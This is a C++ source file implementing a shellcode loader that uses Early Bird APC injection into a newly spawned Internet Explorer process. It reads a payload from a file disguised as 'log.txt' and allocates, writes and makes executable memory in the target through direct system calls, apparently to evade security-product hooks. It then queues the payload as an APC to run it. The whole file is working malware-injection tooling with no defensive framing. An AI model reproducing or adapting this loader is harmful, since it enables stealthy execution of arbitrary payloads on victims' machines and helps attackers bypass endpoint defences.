// Apcsyscall.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include "apcsyscall.h"

int readShellcodeFromFile(const std::string& filename, std::vector<unsigned char>& shellcode) {
    std::ifstream file(filename, std::ios::binary);

    if (file) {
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        shellcode.resize(size);

        file.seekg(0, std::ios::beg);
        file.read(reinterpret_cast<char*>(shellcode.data()), size);
        file.close();
        return 0;
    }
    else {
        exit(0);
    }
}

std::tuple<DWORD, HANDLE, HANDLE> CreateProcessAndStop(const std::string& lpProcessName) {
    std::string lpPath = lpProcessName;
    STARTUPINFOA Si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION Pi = { 0 };

    if (!CreateProcessA(NULL, (LPSTR)(lpPath.data()), NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)) {
        std::cout << "CreateProcess Windows Error code is " << GetLastError() << std::endl;
        return { 0, INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
    }
    return { Pi.dwProcessId, Pi.hProcess, Pi.hThread };
}

std::tuple<BOOL, PVOID> syscallInject(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
    SIZE_T sNumberOfBytesWritten = NULL;
    PVOID pAddress = nullptr;
    NTSTATUS STATUS1 =  Sw3NtAllocateVirtualMemory(hProcess,&pAddress, NULL, &sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS1 != 0) {
        std::cout << "Windows Error code is " << GetLastError() << std::endl;
        return std::make_tuple(FALSE, nullptr);
    }
    //pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        std::cout << "Windows Error code is " << GetLastError() << std::endl;
        return std::make_tuple(FALSE, nullptr);
    }
    NTSTATUS STATUS2 = Sw3NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten);
    if (STATUS2 != 0) {
        std::cout << "Windows Error code is " << GetLastError() << std::endl;
        return std::make_tuple(FALSE, nullptr);
    }
    //if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
    //    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    //    return std::make_tuple(FALSE, nullptr);
    //}
    //PAGE_EXECUTE_READWRITE 
    DWORD dwOldProtection = NULL;
    NTSTATUS STATUS3 = Sw3NtProtectVirtualMemory(hProcess, &pAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    if (STATUS3 != 0) {
        std::cout << "Windows Error code is " << GetLastError() << std::endl;
        return std::make_tuple(FALSE, nullptr);
    }

    //if (!VirtualProtectEx(hProcess, pAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
    //    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    //    std::cout << "Windows Error code is " << GetLastError() << std::endl;
    //    return std::make_tuple(FALSE, nullptr);
    //}

    return std::make_tuple(TRUE, pAddress);
}


int main()
{
    auto [PId, hProcess, hThread] = CreateProcessAndStop("C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe");
    std::vector<unsigned char> shellcode;
    readShellcodeFromFile("log.txt", shellcode);
    auto [if_success, pAddress] = syscallInject(hProcess, shellcode.data(), shellcode.size());
    WaitForSingleObject(GetCurrentThread(), 20000);
    //QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
    Sw3NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)pAddress, NULL, NULL, NULL);
    DebugActiveProcessStop(PId);
    CloseHandle(hProcess);
    CloseHandle(hThread);
}

